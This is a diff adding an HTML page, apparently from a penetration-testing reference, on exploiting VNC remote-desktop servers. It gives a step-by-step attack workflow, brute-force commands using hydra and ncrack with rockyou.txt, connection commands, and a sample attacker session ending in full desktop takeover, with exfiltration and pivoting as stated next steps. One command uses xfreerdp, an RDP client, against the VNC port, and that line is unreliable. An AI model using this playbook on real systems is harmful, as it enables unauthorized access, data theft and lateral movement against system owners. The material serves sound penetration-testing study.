@@ -1,0 +1,158 @@
+<!-- Title -->
+<h1 class="text-2xl font-bold mb-2">VNC Exploitation</h1>
+<p class="text-gray-300 mb-4">
+  Domain: <strong>Remote Access</strong> • Focus: <strong>VNC Abuse & Unauthorized Access</strong> • Last Updated: <strong>2025-09-05</strong>
+</p>
+
+<!-- Summary -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Summary</h2>
+  <p class="text-gray-300">
+    Virtual Network Computing (VNC, TCP/5900+) is a remote desktop protocol 
+    used across enterprise systems and IoT devices. Misconfigured VNC servers 
+    often lack authentication or rely on weak passwords, allowing attackers 
+    to gain full desktop access. Exploitation techniques include brute forcing 
+    VNC authentication, abusing unauthenticated access, and deploying 
+    credential replay. Once compromised, VNC provides interactive GUI 
+    access for lateral movement, data exfiltration, and persistence.
+  </p>
+</section>
+
+<!-- Why Exploitable -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
+  <ul class="list-disc ml-5 text-gray-200 space-y-2">
+    <li><strong>No Authentication:</strong> Many VNC deployments expose unauthenticated access.</li>
+    <li><strong>Weak Passwords:</strong> Short VNC passwords (max 8 chars) easily brute forced.</li>
+    <li><strong>No Encryption:</strong> VNC sends traffic in plaintext, enabling MITM attacks.</li>
+    <li><strong>Wide Exposure:</strong> Often left exposed on internet-facing IoT/servers.</li>
+    <li><strong>Full GUI Control:</strong> Compromise grants attackers direct desktop access.</li>
+  </ul>
+</section>
+
+<!-- How Exploitation Works -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li><strong>Discovery:</strong> Identify VNC services (TCP/5900+).</li>
+    <li><strong>Authentication:</strong> Test for no password or brute force weak creds.</li>
+    <li><strong>Exploitation:</strong> Connect using VNC client or replay cracked creds.</li>
+    <li><strong>Impact:</strong> Full desktop takeover, keylogging, data theft, and lateral movement.</li>
+  </ol>
+</section>
+
+<!-- Steps -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Steps</h2>
+  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
+    <li>Scan and fingerprint VNC services on TCP/5900+.</li>
+    <li>Check for no authentication or weak password configs.</li>
+    <li>Brute force or replay credentials.</li>
+    <li>Login via VNC client for interactive desktop access.</li>
+    <li>Exfiltrate data or pivot further into the network.</li>
+  </ol>
+</section>
+
+<!-- Commands -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Commands</h2>
+  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">
+
+# ------------------------------
+# Discovery
+# ------------------------------
+nmap -p5900-5905 --script vnc-info,vnc-title [target]
+
+# ------------------------------
+# Connect
+# ------------------------------
+vncviewer [target]:5900
+xfreerdp /v:[target]:5900 /u:user /p:pass
+
+# ------------------------------
+# Brute Force
+# ------------------------------
+hydra -P rockyou.txt -s 5900 [target] vnc
+ncrack -p 5900 --user admin -P rockyou.txt [target]
+
+# ------------------------------
+# Example Workflow
+# ------------------------------
+nmap -p5900 192.168.1.90 --script vnc-info
+hydra -P rockyou.txt -s 5900 192.168.1.90 vnc
+vncviewer 192.168.1.90:5900
+  </pre>
+</section>
+
+<!-- Real-World Exploitation Walkthrough -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to expand attacker session
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+[ saide ~ ]$ nmap -p5900 --script vnc-info 192.168.1.90
+PORT     STATE SERVICE
+5900/tcp open  vnc
+| vnc-info:
+|   Protocol version: RFB 003.008
+|   Security types: None, VNC Authentication
+
+[ saide ~ ]$ hydra -P rockyou.txt -s 5900 192.168.1.90 vnc
+[5900][vnc] host: 192.168.1.90   login: <none>   password: password123
+
+[ saide ~ ]$ vncviewer 192.168.1.90:5900
+[+] Connected — full desktop access obtained
+
+Attacker can now view/modify victim’s screen, steal data, and install persistence.
+    </pre>
+  </details>
+</section>
+
+<!-- Example Results -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
+  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
+  <details class="bg-gray-900 rounded p-3">
+    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
+      Click to view sample VNC exploitation results
+    </summary>
+    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">
+
+# Service Discovery
+5900/tcp open  vnc (RFB 003.008)
+
+# Weak Credentials
+<none> : password123
+
+# Exploitation
+Attacker logged in via VNC viewer
+
+# Proof of Exploitation
+Full interactive desktop session controlled by attacker
+    </pre>
+  </details>
+</section>
+
+<!-- References -->
+<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
+  <h2 class="text-lg font-semibold mb-2">References</h2>
+  <ul class="list-disc ml-5 text-gray-200">
+    <li>
+      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        HackTricks – Pentesting VNC
+      </a>
+    </li>
+    <li>
+      <a href="https://attack.mitre.org/techniques/T1021/005/" 
+         target="_blank" 
+         class="text-blue-400 underline hover:text-blue-300">
+        MITRE ATT&CK – Remote Services: VNC
+      </a>
+    </li>
+    <li>Red Team workflow: Discover → Weak creds → Connect → GUI takeover → Lateral movement.</li>
+  </ul>
+</section>
